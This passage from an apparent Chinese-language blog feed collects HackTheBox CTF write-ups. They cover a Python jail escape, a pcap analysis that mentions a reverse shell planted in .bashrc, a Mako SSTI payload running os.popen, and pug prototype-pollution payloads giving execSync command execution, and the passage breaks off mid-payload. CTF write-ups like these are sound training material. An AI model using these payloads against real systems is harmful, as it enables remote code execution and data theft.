interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=7618b017ef4299337610a90a0a6ccb7f9efc44a4, <span class="keyword">for</span> GNU/Linux 3.2.0, not stripped</span><br></pre></td></tr></table></figure></div><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/casino_pwn.png"                      alt="pwn"                ></p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul><li><a class="link"   href="https://motasemhamdan.medium.com/hackthebox-flag-casino-reverse-engineering-ctf-writeups-2247bc6dafee" >https://motasemhamdan.medium.com/hackthebox-flag-casino-reverse-engineering-ctf-writeups-2247bc6dafee <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Exploitation&quot;&gt;&lt;a href=&quot;#Exploitation&quot; class=&quot;headerlink&quot; title=&quot;Exploitation&quot;&gt;&lt;/a&gt;Exploitation&lt;/h2&gt;&lt;p&gt;這是一題逆向，因為程式不長就直接放上來：&lt;/p&gt;
&lt;div </summary>
      
    
    
    
    
    <category term="htb" scheme="https://kazma.tw/tags/htb/"/>
    
    <category term="challenges" scheme="https://kazma.tw/tags/challenges/"/>
    
    <category term="writeup&#39;" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="rev" scheme="https://kazma.tw/tags/rev/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox-Challenges Locked Away Writeup</title>
    <link href="https://kazma.tw/2024/11/01/HackTheBox-Challenges-Locked-Away-Writeup/"/>
    <id>https://kazma.tw/2024/11/01/HackTheBox-Challenges-Locked-Away-Writeup/</id>
    <published>2024-11-01T07:38:20.786Z</published>
    <updated>2024-11-01T08:27:44.987Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Exploitaion"><a href="#Exploitaion" class="headerlink" title="Exploitaion"></a>Exploitaion</h2><p>耶這題是有趣的 pyjail。</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">╰─ cat challenge/main.py                                ─╯</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">open_chest</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="built_in">print</span>(f.read())</span><br><span class="line"></span><br><span class="line">blacklist = [</span><br><span class="line">    <span class="string">&#x27;import&#x27;</span>, <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;breakpoint&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;txt&#x27;</span>, <span class="string">&#x27;read&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;dir&#x27;</span>, <span class="string">&#x27;print&#x27;</span>, <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;[&#x27;</span>, <span class="string">&#x27;]&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;echo&#x27;</span>, <span class="string">&#x27;cat&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;open&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    command = <span class="built_in">input</span>(<span class="string">&#x27;The chest lies waiting... &#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">any</span>(b <span class="keyword">in</span> command <span class="keyword">for</span> b <span class="keyword">in</span> blacklist):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Invalid command!&#x27;</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">exec</span>(command)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;You have been locked away...&#x27;</span>)</span><br><span class="line">        exit(<span class="number">1337</span>)</span><br></pre></td></tr></table></figure></div><p>稍微整理了一下題目的主邏輯如上，總之就是有個無限迴圈會把 input 拿去執行 exec 但是要繞黑名單，這邊提供幾種做法：</p><ol><li>首先第一種是我們可以透過 <code>blacklist.clear()</code> 或是 <code>blacklist = &#39;&#39;</code> 先清除黑名單後 call <code>open_chest()</code></li><li>另一種做法是假設他只能輸入一次的話，我們可以嘗試用其他方式呼叫 <code>open_chest()</code>，例如：<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [5]: list(b<span class="string">&#x27;open_chest&#x27;</span>)</span><br><span class="line">Out[5]: [111, 112, 101, 110, 95, 99, 104, 101, 115, 116]</span><br></pre></td></tr></table></figure></div>我們把它換成 ascii，然後用下面的方式代表 ‘open_chest’：<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [6]: bytes([111, 112, 101, 110, 95, 99, 104, 101, 115, 116]).decode()</span><br><span class="line">Out[6]: <span class="string">&#x27;open_chest&#x27;</span></span><br></pre></td></tr></table></figure></div>再來我們可以透過 <code>globals.get()</code> 去呼叫到 <code>open_chest</code> 函式：<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">The chest lies waiting... globals().get(bytes((<span class="number">111</span>, <span class="number">112</span>, <span class="number">101</span>, <span class="number">110</span>, <span class="number">95</span>, <span class="number">99</span>, <span class="number">104</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">116</span>)).decode())()</span><br><span class="line">HTB&#123;bL4cKl1sT?_bUt_tH4t<span class="string">&#x27;5_t0o_3asY&#125;</span></span><br></pre></td></tr></table></figure></div>Amazing!</li><li>再來是我們也可以換字型直接繞過，像是：<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">The chest lies waiting... 𝖔𝖕𝖊𝖓_𝖈𝖍𝖊𝖘𝖙()</span><br><span class="line">HTB&#123;bL4cKl1sT?_bUt_tH4t<span class="string">&#x27;5_t0o_3asY&#125;</span></span><br><span class="line"><span class="string">The chest lies waiting...</span></span><br></pre></td></tr></table></figure></div></li></ol><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/locked_away_pwn.png"                      alt="pwn"                ></p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul><li><a class="link"   href="https://www.linkedin.com/pulse/hackthebox-locked-away-python-ctf-writeups-motasem-hamdan-yozjf/" >https://www.linkedin.com/pulse/hackthebox-locked-away-python-ctf-writeups-motasem-hamdan-yozjf/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li><li><a class="link"   href="https://nikos-titomichelakis.medium.com/htb-business-ctf-2024-the-vault-of-hope-b06d701e0520" >https://nikos-titomichelakis.medium.com/htb-business-ctf-2024-the-vault-of-hope-b06d701e0520 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Exploitaion&quot;&gt;&lt;a href=&quot;#Exploitaion&quot; class=&quot;headerlink&quot; title=&quot;Exploitaion&quot;&gt;&lt;/a&gt;Exploitaion&lt;/h2&gt;&lt;p&gt;耶這題是有趣的 pyjail。&lt;/p&gt;
&lt;div class=&quot;hi</summary>
      
    
    
    
    
    <category term="htb" scheme="https://kazma.tw/tags/htb/"/>
    
    <category term="challenges" scheme="https://kazma.tw/tags/challenges/"/>
    
    <category term="writeup&#39;" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="misc" scheme="https://kazma.tw/tags/misc/"/>
    
    <category term="pyjail" scheme="https://kazma.tw/tags/pyjail/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox-Challenges Wrong Spooky Season Writeup</title>
    <link href="https://kazma.tw/2024/10/31/HackTheBox-Challenges-Wrong-Spooky-Season-Writeup/"/>
    <id>https://kazma.tw/2024/10/31/HackTheBox-Challenges-Wrong-Spooky-Season-Writeup/</id>
    <published>2024-10-31T11:26:23.920Z</published>
    <updated>2024-10-31T11:57:15.500Z</updated>
    
    <content type="html"><![CDATA[<p>這題給我們封包分析，可以練習一下 wireshark 的用法。<br>首先我們可以先看 Statistics -&gt; Protocol Hierarchy 看一下有哪些協議：<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/spooky_hierarchy.png"                      alt="hierarchy"                ><br>我們首先關心的是其中的 data，我們可以直接搜尋 data 的封包，或是右鍵 Apply as Filter -&gt; Selected，然後我們 Follow TCP stream 可以看到下面的畫面：<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/spooky_b64.png"                      alt="b64"                ><br>我們可以看到駭客執行了一系列的指令操作其中包括把 reverse shell 寫入 &#x2F;root&#x2F;.bashrc 這樣下次開啟 shell 就會觸發，其中還有隱藏訊息，我們把它弄回來就會看到 flag 了：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">╰─ <span class="built_in">echo</span> <span class="string">&quot;==gC9FSI5tGMwA3cfRjd0o2Xz0GNjNjYfR3c1p2Xn5WMyBXNfRjd0o2eCRFS&quot;</span> | rev | <span class="built_in">base64</span> -d                            ─╯</span><br><span class="line">HTB&#123;j4v4_5pr1ng_just_b3c4m3_j4v4_sp00ky!!&#125;</span><br></pre></td></tr></table></figure></div><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/spooky_pwn.png"                      alt="pwn"                ></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;這題給我們封包分析，可以練習一下 wireshark 的用法。&lt;br&gt;首先我們可以先看 Statistics -&amp;gt; Protocol Hierarchy 看一下有哪些協議：&lt;br&gt;&lt;img  
                     lazyload
       </summary>
      
    
    
    
    
    <category term="htb" scheme="https://kazma.tw/tags/htb/"/>
    
    <category term="challenges" scheme="https://kazma.tw/tags/challenges/"/>
    
    <category term="writeup&#39;" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="misc" scheme="https://kazma.tw/tags/misc/"/>
    
    <category term="pcap" scheme="https://kazma.tw/tags/pcap/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox-Challenges Spookifier Writeup</title>
    <link href="https://kazma.tw/2024/10/31/HackTheBox-Challenges-Spookifier-Writeup/"/>
    <id>https://kazma.tw/2024/10/31/HackTheBox-Challenges-Spookifier-Writeup/</id>
    <published>2024-10-31T04:59:04.232Z</published>
    <updated>2024-10-31T05:42:37.562Z</updated>
    
    <content type="html"><![CDATA[<p>剛好這幾天在萬聖節應景解到這題XD<br>首先下面是這題的文件架構：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">╰─ tree .                                              ─╯</span><br><span class="line">.</span><br><span class="line">├── Dockerfile</span><br><span class="line">├── build-docker.sh</span><br><span class="line">├── challenge</span><br><span class="line">│   ├── application</span><br><span class="line">│   │   ├── blueprints</span><br><span class="line">│   │   │   └── routes.py</span><br><span class="line">│   │   ├── main.py</span><br><span class="line">│   │   ├── static</span><br><span class="line">│   │   │   ├── css</span><br><span class="line">│   │   │   │   ├── index.css</span><br><span class="line">│   │   │   │   └── nes.css</span><br><span class="line">│   │   │   └── images</span><br><span class="line">│   │   │       └── vamp.png</span><br><span class="line">│   │   ├── templates</span><br><span class="line">│   │   │   └── index.html</span><br><span class="line">│   │   └── util.py</span><br><span class="line">│   └── run.py</span><br><span class="line">├── config</span><br><span class="line">│   └── supervisord.conf</span><br><span class="line">└── flag.txt</span><br></pre></td></tr></table></figure></div><p>我們逛一下網站還有看一下 <code>main.py</code> 可以看到他是用 python mako 寫的，不過其實我們照著 ssti 的 checklist 測試也可以知道他是用 mako。<br>知道是 ssti 以後我們就可以撈 flag 了，這邊放上最後的 payload 參考：<br><code>http://94.237.63.215:32454/?text=$&#123;self.module.runtime.util.os.popen(%22cat%20../flag*%22).read()&#125;</code></p><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/spoolifier_pwn.png"                      alt="pwn"                ></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;剛好這幾天在萬聖節應景解到這題XD&lt;br&gt;首先下面是這題的文件架構：&lt;/p&gt;
&lt;div class=&quot;highlight-container&quot; data-rel=&quot;Bash&quot;&gt;&lt;figure class=&quot;iseeu highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;</summary>
      
    
    
    
    
    <category term="htb" scheme="https://kazma.tw/tags/htb/"/>
    
    <category term="challenges" scheme="https://kazma.tw/tags/challenges/"/>
    
    <category term="writeup&#39;" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="web" scheme="https://kazma.tw/tags/web/"/>
    
    <category term="ssti" scheme="https://kazma.tw/tags/ssti/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox-Challenges Gunship Writeup</title>
    <link href="https://kazma.tw/2024/10/30/HackTheBox-Challenges-Gunship-Writeup/"/>
    <id>https://kazma.tw/2024/10/30/HackTheBox-Challenges-Gunship-Writeup/</id>
    <published>2024-10-30T14:49:00.775Z</published>
    <updated>2024-10-30T16:10:09.888Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h2><p>這次要來做的是一題 Web 而且有附上 Source Code 還有 Dockerfile，網站畫面很漂亮，只有一個輸入點。<br>這題雖然標非常簡單但個人認為有很多值得我們探討的知識點，一起來研究吧。</p><h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>這題的檔案結構如下：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">╰─ tree .                                                                                                           ─╯</span><br><span class="line">.</span><br><span class="line">├── Dockerfile</span><br><span class="line">├── build-docker.sh</span><br><span class="line">├── challenge</span><br><span class="line">│   ├── flag</span><br><span class="line">│   ├── index.js</span><br><span class="line">│   ├── package.json</span><br><span class="line">│   ├── routes</span><br><span class="line">│   │   └── index.js</span><br><span class="line">│   ├── static</span><br><span class="line">│   │   ├── css</span><br><span class="line">│   │   │   └── main.css</span><br><span class="line">│   │   ├── images</span><br><span class="line">│   │   │   └── favicon.png</span><br><span class="line">│   │   └── js</span><br><span class="line">│   │       └── main.js</span><br><span class="line">│   ├── views</span><br><span class="line">│   │   └── index.html</span><br><span class="line">│   └── yarn.lock</span><br><span class="line">├── config</span><br><span class="line">│   └── supervisord.conf</span><br><span class="line">└── entrypoint.sh</span><br><span class="line"></span><br><span class="line">9 directories, 13 files</span><br></pre></td></tr></table></figure></div><p>程式碼不多，其中特別直得注意的是 index.js。</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> path              = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> express           = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> pug        = <span class="built_in">require</span>(<span class="string">&#x27;pug&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; unflatten &#125;     = <span class="built_in">require</span>(<span class="string">&#x27;flat&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> router            = express.<span class="title class_">Router</span>();</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">sendFile</span>(path.<span class="title function_">resolve</span>(<span class="string">&#x27;views/index.html&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/api/submit&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; artist &#125; = <span class="title function_">unflatten</span>(req.<span class="property">body</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (artist.<span class="property">name</span>.<span class="title function_">includes</span>(<span class="string">&#x27;Haigh&#x27;</span>) || artist.<span class="property">name</span>.<span class="title function_">includes</span>(<span class="string">&#x27;Westaway&#x27;</span>) || artist.<span class="property">name</span>.<span class="title function_">includes</span>(<span class="string">&#x27;Gingell&#x27;</span>)) &#123;</span><br><span class="line"><span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;</span><br><span class="line"><span class="string">&#x27;response&#x27;</span>: pug.<span class="title function_">compile</span>(<span class="string">&#x27;span Hello #&#123;user&#125;, thank you for letting us know!&#x27;</span>)(&#123; <span class="attr">user</span>: <span class="string">&#x27;guest&#x27;</span> &#125;)</span><br><span class="line">&#125;);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;</span><br><span class="line"><span class="string">&#x27;response&#x27;</span>: <span class="string">&#x27;Please provide us with the full name of an existing member.&#x27;</span></span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure></div><p>其中特別值得拿出來說明的是：</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/api/submit&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; artist &#125; = <span class="title function_">unflatten</span>(req.<span class="property">body</span>);</span><br></pre></td></tr></table></figure></div><p>上面這段就是唯一使用者輸入的 post 請求，unflattern 則是會把平面化的資料還原成嵌套的物件，這代表 req.body 可以包含類似 <code>&#123;&quot;artist.name&quot;: &quot;Haigh&quot;&#125;</code> 這樣的平面資料，透過 unflatten 轉換成 <code>&#123; artist: &#123; name: &quot;Haigh&quot; &#125; &#125;</code>。<br>然後 <code>const &#123; artist &#125; = unflatten(req.body);</code> 會從中提取 artist 字段。<br>再來是檢查條件：</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (artist.<span class="property">name</span>.<span class="title function_">includes</span>(<span class="string">&#x27;Haigh&#x27;</span>) || artist.<span class="property">name</span>.<span class="title function_">includes</span>(<span class="string">&#x27;Westaway&#x27;</span>) || artist.<span class="property">name</span>.<span class="title function_">includes</span>(<span class="string">&#x27;Gingell&#x27;</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;</span><br><span class="line">        <span class="string">&#x27;response&#x27;</span>: pug.<span class="title function_">compile</span>(<span class="string">&#x27;span Hello #&#123;user&#125;, thank you for letting us know!&#x27;</span>)(&#123; <span class="attr">user</span>: <span class="string">&#x27;guest&#x27;</span> &#125;)</span><br><span class="line">    &#125;);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;</span><br><span class="line">        <span class="string">&#x27;response&#x27;</span>: <span class="string">&#x27;Please provide us with the full name of an existing member.&#x27;</span></span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>會檢查是否包含特定名字，符合條件就會使用 <code>pug.compile</code> 生成 HTML 內容，並傳入一個變數 user（值為 ‘guest’），產生類似 Hello guest, thank you for letting us know! 的訊息。<br>那上面提到的這兩段其實是有 Prototype Pollution 的風險，因為這段程式碼使用 unflatten 解析使用者輸入的 req.body，而如果使用者輸入了特殊鍵值（如 <strong>proto</strong> 或 constructor），在解展後可能改變 Object.prototype 的內容，造成原型污染。舉例：</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 攻擊者如果輸入:</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;artist.name&quot;</span>: <span class="string">&quot;Haigh&quot;</span>,</span><br><span class="line">  <span class="string">&quot;__proto__.polluted&quot;</span>: <span class="string">&quot;malicious&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解展後的物件可能污染全域原型</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(&#123;&#125;.<span class="property">polluted</span>); <span class="comment">// &quot;malicious&quot;</span></span><br></pre></td></tr></table></figure></div><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>首先我們的首要目標是要觸發 <code>pug.compile</code>，因為我們可以試圖透過 prototype pollution 讓 pug 在渲染的時候使用被我們污染的 block 物件，執行 <code>execSync()</code> 之類的指令操作。<br>所以我們可以透過 burp 去攔截 &#x2F;api&#x2F;submit 的封包，然後把 content 換成：</p><div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;artist.name&quot;</span><span class="punctuation">:</span><span class="string">&quot;Haigh&quot;</span><span class="punctuation">,</span><span class="attr">&quot;__proto__.block&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Text&quot;</span><span class="punctuation">,</span> </span><br><span class="line"><span class="attr">&quot;line&quot;</span><span class="punctuation">:</span> <span class="string">&quot;process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;$(ls | grep flag)&#x27;)&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div><p>然後正常來說我們是看不到輸出的，所以有些人可能會透過 reverse shell 來解這題，但這裡提供一個有趣的解法是，我們可以透過執行 <code>$(ls | grep flag)</code> 讓指令執行的結果變成不能運行的指令，然後跟著錯誤訊息印出來，舉例像是如果我們執行：</p><div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;artist.name&quot;</span><span class="punctuation">:</span><span class="string">&quot;Haigh&quot;</span><span class="punctuation">,</span><span class="attr">&quot;__proto__.block&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Text&quot;</span><span class="punctuation">,</span> </span><br><span class="line"><span class="attr">&quot;line&quot;</span><span class="punctuation">:</span> <span class="string">&quot;process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;kazma&#x27;)&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div><p>我們會得到：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Error: Command failed: kazma&lt;br&gt;/bin/sh: kazma: not found&lt;br&gt; on line 1&lt;br&gt;</span><br></pre></td></tr></table></figure></div><p>所以在這邊 kazma 被當成指令執行，所以根成錯誤訊息印出來，同樣的我們其他指令執行的結果也會被當成無法執行的指令印出來，就可以看到輸出了，所以我們接著來拿 flag：</p><div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;artist.name&quot;</span><span class="punctuation">:</span><span class="string">&quot;Haigh&quot;</span><span class="punctuation">,</span><span class="attr">&quot;__proto__.block&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Text&quot;</span><span class="punctuation">,</span> </span><br><span class="line"><span class="attr">&quot;line&quot;</span><span class="punctuation">:</span> <span class="string">&quot;process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;$(ls | grep flag)&#x27;)&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div><p>我們送出上面的請求可以拿到下面的回應：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Error: Command failed: $(ls | grep flag)&lt;br&gt;/bin/sh: flagvAbC2: not found&lt;br&gt; on line 1&lt;br&gt;</span><br></pre></td></tr></table></figure></div><p>所以檔案名稱是 <code>flagvAbC2</code>，不過我們直接 cat flag* 也可以：</p><div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;artist.name&quot;</span><span class="punctuation">:</span><span class="string">&quot;Haigh&quot;</span><span class="punctuation">,</span><span class="attr">&quot;__proto__.block&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span 